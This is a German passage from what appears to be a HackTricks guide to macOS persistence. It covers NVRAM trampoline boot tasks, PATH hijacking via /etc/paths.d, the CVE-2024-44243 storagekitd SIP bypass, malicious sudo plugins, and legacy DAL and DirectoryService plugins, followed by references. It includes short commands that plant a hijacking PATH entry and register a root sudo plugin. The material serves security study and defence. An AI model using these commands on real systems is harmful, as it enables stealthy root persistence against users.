Writeup: [https://theevilbit.github.io/beyond/beyond_0035/](https://theevilbit.github.io/beyond/beyond_0035/)<sup>[[41]](#references)</sup>

Die Boot-Aufgabe `rc.trampoline` führt beim Booten eine **Plattform-Binärdatei (von Apple signiert)** aus, die in der NVRAM-Variable `apple-trusted-trampoline` gespeichert ist, aber **nur, wenn das Boot-Argument `rc.trampoline=1` gesetzt und SIP deaktiviert ist** (mit einer Größenbegrenzung von ca. 390&nbsp;KB und der Einschränkung, dass die Ausführung blockierend sein oder schnell zurückkehren muss). Da sie **Root-Rechte + deaktiviertes SIP + eine von Apple signierte Payload** erfordert, ist sie für Persistenz in der Praxis nahezu ungeeignet und wird hier nur der Vollständigkeit halber aufgeführt.<sup>[[41]](#references)</sup>

### /etc/paths und /etc/paths.d (PATH hijack)

- Nützlich zum Umgehen der Sandbox: [🔴](https://emojipedia.org/large-red-circle) (Schreibzugriff erfordert Root-Rechte)
- Root-Rechte erforderlich

#### Speicherort

- **`/etc/paths`** und **`/etc/paths.d/*`** — werden von **`path_helper`** (aufgerufen von `/etc/zprofile`) eingelesen, um beim Anmelden den Standardwert für `PATH` zu erstellen.

#### Beschreibung und Ausnutzung

Beide Dateien gehören Root. Wird ein vom Angreifer kontrolliertes Verzeichnis vorangestellt (durch Bearbeiten von `/etc/paths` oder Ablegen einer Datei in `/etc/paths.d/`), erscheint dieses Verzeichnis früh in `PATH` jeder neuen Login-Shell. Eine bösartige Binärdatei mit dem Namen eines gängigen Befehls (`ls`, `git`, …) **überschattet** dadurch die echte Datei und wird ausgeführt, sobald das Opfer den Befehl das nächste Mal aufruft.

```bash
# e.g. Homebrew already ships a /etc/paths.d entry; an attacker drops their own
echo "/private/tmp/evil" | sudo tee /etc/paths.d/00-evil
# -> /private/tmp/evil is prepended to PATH for new login shells
```

### storagekitd SIP-Umgehung (CVE-2024-44243)

Writeup: [https://www.microsoft.com/en-us/security/blog/2025/01/13/analyzing-cve-2024-44243-a-macos-system-integrity-protection-bypass-through-kernel-extensions/](https://www.microsoft.com/en-us/security/blog/2025/01/13/analyzing-cve-2024-44243-a-macos-system-integrity-protection-bypass-through-kernel-extensions/)<sup>[[46]](#references)</sup>

- Nützlich, um die Sandbox zu umgehen: [🔴](https://emojipedia.org/large-red-circle) (Root erforderlich)
- Root erforderlich; das Ergebnis **umgeht SIP**. Betroffen sind macOS-Versionen **15.0–15.1**, behoben in **15.2**

#### Speicherort

- Ein Dateisystem-Bundle in **`/Library/Filesystems/`** ablegen.

#### Beschreibung & Ausnutzung

`storagekitd` besitzt das Entitlement **`com.apple.rootless.install.heritable`** und startete die Binärdateien von Dateisystem-Bundles mit dieser SIP-umgehenden Fähigkeit **geerbt**. Durch das Platzieren eines bösartigen Dateisystem-Bundles konnte ein Angreifer Code mit SIP-Umgehung ausführen, um **persistente Kernel-Erweiterungen** zu installieren oder in SIP-geschützte `LaunchDaemon`-Verzeichnisse zu schreiben – eine Persistenz, die normale Schutzmaßnahmen übersteht und außer Kraft setzt.<sup>[[46]](#references)</sup> Apple hat die Schwachstelle in macOS Sequoia 15.2 behoben.

### sudo-Plugins (/etc/sudo.conf)

Writeup: [On Writing Sudo Plugins (sigma-star)](https://blog.sigma-star.io/2025/07/on-writing-sudo-plugins/)<sup>[[51]](#references)</sup>

- Nützlich, um die Sandbox zu umgehen: [🔴](https://emojipedia.org/large-red-circle) (Root erforderlich, um `/etc/sudo.conf` zu schreiben)
- Root erforderlich, um das Plugin zu installieren; anschließend wird es **bei jedem Aufruf von `sudo`** ausgeführt (im setuid-root-Kontext)

#### Speicherort

- **`/etc/sudo.conf`** — `Plugin`-Zeilen laden Shared Objects aus **`/usr/libexec/sudo/`** (oder über einen absoluten Pfad). Die Datei ist standardmäßig nicht vorhanden (sudo verwendet eine integrierte Richtlinie), sodass sie sich sauber als Hook einrichten lässt.

#### Beschreibung & Ausnutzung

`sudo` lädt seine Richtlinien-, Genehmigungs- und Audit-Plugins aus `/etc/sudo.conf`. Da `sudo` setuid-root ist, wird ein bösartiges Shared-Object-Plugin **jedes Mal mit Root-Rechten ausgeführt, wenn ein beliebiger Benutzer `sudo` ausführt** – eine dauerhafte Root-Persistenz, die zudem jeden sudo-Befehl erfasst.<sup>[[51]](#references)</sup> macOS wird mit sudo 1.9.x ausgeliefert, das die Plugin-API unterstützt.

```bash
# As root: load a malicious audit/approval plugin on every sudo
cat > /etc/sudo.conf <<'CONF'
Plugin sudoers_policy sudoers.so
Plugin ht_audit /usr/libexec/sudo/ht_audit.so
CONF
# ht_audit.so's constructor / audit_open runs as root on the next `sudo <anything>`
```

### CoreMediaIO-DAL-Plug-ins

Writeup: [https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/](https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/)<sup>[[53]](#references)</sup>\
Minimales Beispiel: [https://github.com/johnboiles/coremediaio-dal-minimal-example](https://github.com/johnboiles/coremediaio-dal-minimal-example)<sup>[[54]](#references)</sup>

- **Veralteter Mechanismus:** Seit macOS 12.3 veraltet. macOS 14.1 und neuere Versionen deaktivieren veraltete Video-Plug-ins standardmäßig. Der Benutzer muss die Unterstützung für veraltete Videos in der Recovery wiederherstellen, bevor dieser Pfad funktioniert; ein beschreibbares Verzeichnis allein reicht nicht aus. [Aktuelle Support-Anleitung von Apple](https://support.apple.com/en-us/108387).
- Zum Schreiben in das Plug-in-Verzeichnis ist Root erforderlich. Die Codeausführung hängt davon ab, ob ein kompatibler Client DAL-Plug-ins noch lädt; dies wurde unter macOS 26 nicht zur Laufzeit getestet.

#### Speicherort

- **`/Library/CoreMediaIO/Plug-Ins/DAL/*.plugin`**
  - Root erforderlich
  - **Auslöser:** Ein kompatibler Kamera-Client listet Geräte auf, **nachdem die Unterstützung für veraltete Videos wiederhergestellt wurde**. Die Library Validation des Clients kann ein Drittanbieter-Plug-in blockieren.

#### Beschreibung und Ausnutzung

CoreMediaIO-**DAL**-Plug-ins (Device Abstraction Layer) wurden von einigen Kamera-Apps prozessintern geladen. Apples [Präsentation zu Kameraerweiterungen](https://developer.apple.com/videos/play/wwdc2022/10022/) sagt ausdrücklich, dass veraltete DAL-Plug-ins **nicht** mit FaceTime, QuickTime Player oder Photo Booth funktionierten und viele andere Clients Library Validation erzwingen. Moderne [Core-Media-I/O-Erweiterungen](https://developer.apple.com/documentation/coremediaio) laufen außerhalb des Prozesses und verwenden ein separates Installations- und Genehmigungsmodell. Die historische prozessinterne Technik bedeutet nicht, dass sie einen allgemeinen Camera-TCC-Bypass unter aktuellem macOS ermöglicht.<sup>[[53]](#references)[[54]](#references)</sup>

Nur lesende Untersuchung unter macOS 26: `/Library/CoreMediaIO/Plug-Ins/DAL` ist vorhanden und gehört Root. Weder die Unterstützung für veraltete Videos noch das Laden durch einen Client wurde überprüft.

### Directory-Service-Plug-ins

Writeup: [https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/](https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/)<sup>[[53]](#references)</sup>

- **Veralteter, bedingter Mechanismus:** Für die Installation ist Root erforderlich; außerdem muss das Plug-in tatsächlich konfiguriert und geladen sein. Die Plug-in-API von DirectoryService ist veraltet. Prüfen Sie die Open-Directory-Konfiguration des Ziel-Macs, bevor Sie dies als Boot-Auslöser betrachten.

#### Speicherort

- **`/Library/DirectoryServices/PlugIns/*.dsplug`**
  - Root erforderlich
  - **Auslöser:** `dspluginhelperd` lädt ein geeignetes, konfiguriertes Plug-in, wenn Open Directory es benötigt. Laut [Apples Laufzeit-Anleitung für Plug-ins](https://developer.apple.com/library/archive/documentation/Networking/Conceptual/Open_Dir_Plugin/RuntimeEnviornment/RuntimeEnviornment.html) können Plug-ins, die nicht für den Start konfiguriert sind, verzögert geladen werden, wenn ihr Knoten geöffnet wird.

#### Beschreibung und Ausnutzung

`dspluginhelperd` unterstützt veraltete DirectoryService-Plug-in-Bundles. Ein schädliches Plug-in kann einen privilegierten Ausführungspfad darstellen, wenn das veraltete Plug-in akzeptiert und aktiviert wird. Dieser Pfad unterscheidet sich von PAM- und Authorization-Plug-ins. Dass das Verzeichnis vorhanden ist, belegt nicht, dass ein neu geschriebenes Plug-in beim nächsten Boot ausgeführt wird. Die lokalen Handbücher `dspluginhelperd(8)` und `opendirectoryd(8)` von Apple führen den Helper und diesen veralteten Pfad unter macOS 26.5 weiterhin auf.<sup>[[53]](#references)</sup>

Nur lesende Untersuchung unter macOS 26: `/Library/DirectoryServices/PlugIns` und `/usr/libexec/dspluginhelperd` sind vorhanden. Während dieses Tests wurde kein Plug-in installiert, konfiguriert oder geladen.

## Persistence-Techniken und Tools

- [https://github.com/cedowens/Persistent-Swift](https://github.com/cedowens/Persistent-Swift)
- [https://github.com/D00MFist/PersistentJXA](https://github.com/D00MFist/PersistentJXA)

## References

- [1] [2025, das Jahr des Infostealers](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [2] [Über die guten alten LaunchAgents hinaus – 1 – Shell-Startdateien](https://theevilbit.github.io/beyond/beyond_0001/)
- [3] [Über die guten alten LaunchAgents hinaus – 18 – X11 und XQuartz](https://theevilbit.github.io/beyond/beyond_0018/)
- [4] [Über die guten alten LaunchAgents hinaus – 21 – erneut geöffnete Apps](https://theevilbit.github.io/beyond/beyond_0021/)
- [5] [Über die guten alten LaunchAgents hinaus – 20 – Terminal-Einstellungen](https://theevilbit.github.io/beyond/beyond_0020/)
- [6] [Über die guten alten LaunchAgents hinaus – 13 – Audio-Plug-ins](https://theevilbit.github.io/beyond/beyond_0013/)
- [7] [Audio-Unit-Plug-ins (SpecterOps)](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)
- [8] [Über die guten alten LaunchAgents hinaus – 12 – QuickLook-Plug-ins](https://theevilbit.github.io/beyond/beyond_0012/)
- [9] [Über die guten alten LaunchAgents hinaus – 22 – LoginHook und LogoutHook](https://theevilbit.github.io/beyond/beyond_0022/)
- [10] [Über die guten alten LaunchAgents hinaus – 4 – cron-Jobs](https://theevilbit.github.io/beyond/beyond_0004/)
- [11] [Über die guten alten LaunchAgents hinaus – 2 – iTerm2-Start](https://theevilbit.github.io/beyond/beyond_0002/)
- [12] [Über die guten alten LaunchAgents hinaus – 7 – xbar-Plug-ins](https://theevilbit.github.io/beyond/beyond_0007/)
- [13] [Über die guten alten LaunchAgents hinaus – 8 – Hammerspoon](https://theevilbit.github.io/beyond/beyond_0008/)
- [14] [Über die guten alten LaunchAgents hinaus – 6 – SSHRC](https://theevilbit.github.io/beyond/beyond_0006/)
- [15] [Über die guten alten LaunchAgents hinaus – 3 – Anmeldeobjekte](https://theevilbit.github.io/beyond/beyond_0003/)
- [16] [Über die guten alten LaunchAgents hinaus – 14 – atrun](https://theevilbit.github.io/beyond/beyond_0014/)
- [17] [Über die guten alten LaunchAgents hinaus – 24 – Ordneraktionen](https://theevilbit.github.io/beyond/beyond_0024/)
- [18] [Ordneraktionen für Persistence unter macOS (SpecterOps)](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)
- [19] [Über die guten alten LaunchAgents hinaus – 27 – Dock-Kurzbefehle](https://theevilbit.github.io/beyond/beyond_0027/)
- [20] [Über die guten alten LaunchAgents hinaus – 17 – Farbwähler](https://theevilbit.github.io/beyond/beyond_0017/)
- [21] [Über die guten alten LaunchAgents hinaus – 26 – Finder-Sync-Plug-ins](https://theevilbit.github.io/beyond/beyond_0026/)
- [22] [Analyse der Persistence von „Mac File Opener“ (Objective-See)](https://objective-see.org/blog/blog_0x11.html)
- [23] [Über die guten alten LaunchAgents hinaus – 16 – Bildschirmschoner](https://theevilbit.github.io/beyond/beyond_0016/)
- [24] [Zugriff sichern: Bildschirmschoner für Persistence unter macOS (SpecterOps)](https://posts.specterops.io/saving-your-access-d562bf5bf90b)
- [25] [Über die guten alten LaunchAgents hinaus – 11 – Spotlight-Importer](https://theevilbit.github.io/beyond/beyond_0011/)
- [26] [Über die guten alten LaunchAgents hinaus – 9 – Einstellungsbereich](https://theevilbit.github.io/beyond/beyond_0009/)
- [27] [Über die guten alten LaunchAgents hinaus – 19 – periodische Skripte](https://theevilbit.github.io/beyond/beyond_0019/)
- [28] [Über die guten alten LaunchAgents hinaus – 5 – Pluggable Authentication Modules (PAM)](https://theevilbit.github.io/beyond/beyond_0005/)
- [29] [Über die guten alten LaunchAgents hinaus – 28 – Authorization-Plug-ins](https://theevilbit.github.io/beyond/beyond_0028/)
- [30] [Persistenter Diebstahl von Anmeldedaten mit Authorization-Plug-ins (SpecterOps)](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)
- [31] [Über die guten alten LaunchAgents hinaus – 30 – Die man-Konfigurationsdatei – man.conf](https://theevilbit.github.io/beyond/beyond_0030/)
- [32] [Über die guten alten LaunchAgents hinaus – 25 – Apache2-Module](https://theevilbit.github.io/beyond/beyond_0025/)
- [33] [Über die guten alten LaunchAgents hinaus – 31 – BSM-Audit-Framework](https://theevilbit.github.io/beyond/beyond_0031/)
- [34] [Über die guten alten LaunchAgents hinaus – 23 – emond, der Event-Monitor-Daemon](https://theevilbit.github.io/beyond/beyond_0023/)
- [35] [Über die guten alten LaunchAgents hinaus – 29 – amstoold](https://theevilbit.github.io/beyond/beyond_0029/)
- [36] [Über die guten alten LaunchAgents hinaus – 15 – xsanctl](https://theevilbit.github.io/beyond/beyond_0015/)
- [37] [Über die guten alten LaunchAgents hinaus – 10 – Anwendungsskriptdateien](https://theevilbit.github.io/beyond/beyond_0010/)
- [38] [Über die guten alten LaunchAgents hinaus – 32 – Dock-Tile-Plug-ins](https://theevilbit.github.io/beyond/beyond_0032/)
- [39] [Über die guten alten LaunchAgents hinaus – 33 – Widgets](https://theevilbit.github.io/beyond/beyond_0033/)
- [40] [Über die guten alten LaunchAgents hinaus – 34 – launchd-Boot-Aufgaben](https://theevilbit.github.io/beyond/beyond_0034/)
- [41] [Über die guten alten LaunchAgents hinaus – 35 – Persistence über NVRAM (apple-trusted-trampoline)](https://theevilbit.github.io/beyond/beyond_0035/)
- [42] [E-Mail für Persistence unter OS X verwenden (n00py)](https://www.n00py.io/2016/10/using-email-for-persistence-on-os-x/)
- [43] [Verdächtige Änderung der Apple-Mail-Regel-Plist (Elastic)](https://www.elastic.co/guide/en/security/current/suspicious-apple-mail-rule-plist-modification.html)
- [44] [Schädliche Profile – eine der größten Bedrohungen für Macs (Jamf)](https://www.jamf.com/blog/malicious-profiles-come/)
- [45] [The Art of Mac Malware Vol.1 – Kap. 0x2 Persistence (dyld)](https://taomm.org/PDFs/vol1/CH%200x02%20Persistence.pdf)
- [46] [Analyse von CVE-2024-44243, einem macOS-SIP-Bypass über Kernel-Erweiterungen (Microsoft)](https://www.microsoft.com/en-us/security/blog/2025/01/13/analyzing-cve-2024-44243-a-macos-system-integrity-protection-bypass-through-kernel-extensions/)
- [47] [RCE und Exfiltration von API-Tokens über Claude-Code-Projektdateien (CVE-2025-59536, Check Point)](https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files-cve-2025-59536/)
- [48] [Neue Schwachstelle in GitHub Copilot und Cursor – Hintertür über Rules-Datei (Pillar Security)](https://www.pillar.security/blog/new-vulnerability-in-github-copilot-and-cursor-how-hackers-can-weaponize-code-agents)
- [49] [Chrome – alternative Installationsmethoden (externe Erweiterungen)](https://developer.chrome.com/docs/extensions/how-to/distribute/install-extensions)
- [50] [ExtensionInstallForcelist in Chrome auf dem Mac entfernen (macsecurity.net)](https://macsecurity.net/view/492-extensioninstallforcelist-chrome-policy-mac)
- [51] [Über das Schreiben von Sudo-Plug-ins (sigma-star)](https://blog.sigma-star.io/2025/07/on-writing-sudo-plugins/)
- [52] [Remote Mac Exploitation über benutzerdefinierte URL-Schemes (Objective-See)](https://objective-see.org/blog/blog_0x38.html)
- [53] [Zwei macOS-Persistence-Tricks durch den Missbrauch von Plug-ins (codecolorist)](https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/)
- [54] [Minimales CoreMediaIO-DAL-Beispiel (johnboiles)](https://github.com/johnboiles/coremediaio-dal-minimal-example)
- [55] [Sploitlight: Analyse einer Spotlight-basierten macOS-TCC-Schwachstelle (Microsoft)](https://www.microsoft.com/en-us/security/blog/2025/07/28/sploitlight-analyzing-a-spotlight-based-macos-tcc-vulnerability/)
- [56] [Dokumentation des Python-`site`-Moduls (.pth / usercustomize / sitecustomize)](https://docs.python.org/3/library/site.html)
{{#include ../banners/hacktricks-training.md}}
